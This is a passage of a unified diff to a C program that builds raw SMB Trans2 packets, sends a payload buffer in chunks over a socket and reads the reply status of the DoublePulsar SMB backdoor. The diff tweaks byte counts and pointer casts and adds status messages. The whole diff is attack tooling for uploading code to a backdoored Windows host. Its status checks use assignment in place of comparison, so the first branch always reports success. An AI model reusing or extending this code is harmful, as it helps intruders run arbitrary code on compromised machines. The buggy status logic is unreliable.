@@ -844,23 +844,23 @@ int main(int argc, char* argv[])
 
 			//update size
 			memcpy(last_packet + 2, &smb_htons_len, 2);
-			hexDump(NULL, (char*)last_packet, 4);
+			//hexDump(NULL, (char*)last_packet, 4);
 
 			TotalDataCount = bytesLeft;
 			DataCount = bytesLeft;
-			byteCount = bytesLeft + 13;
+			byteCount = bytesLeft + 12;
 
 			*(WORD*)(last_packet + 0x27) = TotalDataCount;
 			*(WORD*)(last_packet + 0x3b) = DataCount;
 			*(WORD*)(last_packet + 0x43) = byteCount;
 
-			memcpy((unsigned char*)last_packet + 0x27, (char*)&TotalDataCount, 2);
-			memcpy((unsigned char*)last_packet + 0x3b, (char*)&DataCount, 2);
-			memcpy((unsigned char*)last_packet + 0x43, (char*)&byteCount, 2);
+			memcpy((unsigned char*)last_packet + 0x27, (unsigned char*)&TotalDataCount, 2);
+			memcpy((unsigned char*)last_packet + 0x3b, (unsigned char*)&DataCount, 2);
+			memcpy((unsigned char*)last_packet + 0x43, (unsigned char*)&byteCount, 2);
 
 			//Update treeID, UserID
-			memcpy((unsigned char*)last_packet + 28, (char*)&treeid, 2);
-			memcpy((unsigned char*)last_packet + 32, (char*)&userid, 2);
+			memcpy((unsigned char*)last_packet + 28, (unsigned char*)&treeid, 2);
+			memcpy((unsigned char*)last_packet + 32, (unsigned char*)&userid, 2);
 
 			//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
 			memcpy((unsigned char*)last_packet + 70, (unsigned char*)Parametersbuffer, 12);
@@ -880,8 +880,19 @@ int main(int argc, char* argv[])
 
 			if (recvbuff[34] = 0x52)
 			{
-				printf("Doublepulsar returned 82!\n");
+				printf("Doublepulsar returned: Success!\n");
 			}
+			
+			else if (recvbuff[34] = 0x62)
+			{
+				printf("Doublepulsar returned: Invalid parameters!\n");
+			}
+			
+			else if (recvbuff[34] = 0x72)
+			{
+				printf("Doublepulsar returned: Allocation failure!\n");
+			}
+				
 			else {
 				printf("Doublepulsar didn't work!\n");
 			}
@@ -912,8 +923,8 @@ int main(int argc, char* argv[])
 		memcpy((unsigned char*)big_packet + 82, (unsigned char*)pFULLBUFFER + ctx, ChunkSize);
 
 		//Update treeID, UserID
-		memcpy((unsigned char*)big_packet + 28, (char*)&treeid, 2);
-		memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);
+		memcpy((unsigned char*)big_packet + 28, (unsigned char*)&treeid, 2);
+		memcpy((unsigned char*)big_packet + 32, (unsigned char*)&userid, 2);
 
 		//send the payload
 		send(sock, (char*)big_packet, size_normal_packet, 0);
@@ -927,8 +938,19 @@ int main(int argc, char* argv[])
 
 		if (recvbuff[34] = 0x52)
 		{
-			printf("Doublepulsar returned 82!\n");
+			printf("Doublepulsar returned: Success!\n");
 		}
+			
+		else if (recvbuff[34] = 0x62)
+		{
+			printf("Doublepulsar returned: Invalid parameters!\n");
+		}
+			
+		else if (recvbuff[34] = 0x72)
+		{
+			printf("Doublepulsar returned: Allocation failure!\n");
+		}
+			
 		else {
 			printf("Doublepulsar didn't work!\n");
 		}
@@ -953,8 +975,8 @@ int main(int argc, char* argv[])
 		"\x00\x08\x41\x00\x00\x00\x00";
 
 	//Update treeID, UserID
-	memcpy((unsigned char*)disconnect_packet + 28, (char*)&treeid, 2);
-	memcpy((unsigned char*)disconnect_packet + 32, (char*)&userid, 2);
+	memcpy((unsigned char*)disconnect_packet + 28, (unsigned char*)&treeid, 2);
+	memcpy((unsigned char*)disconnect_packet + 32, (unsigned char*)&userid, 2);
 
 	//send the disconnect packet
 	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
@@ -967,8 +989,8 @@ int main(int argc, char* argv[])
 		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";
 
 	//Update treeID, UserID
-	memcpy((unsigned char*)logoff_packet + 28, (char*)&treeid, 2);
-	memcpy((unsigned char*)logoff_packet + 32, (char*)&userid, 2);
+	memcpy((unsigned char*)logoff_packet + 28, (unsigned char*)&treeid, 2);
+	memcpy((unsigned char*)logoff_packet + 32, (unsigned char*)&userid, 2);
 
 	//send the logoff packet
 	send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
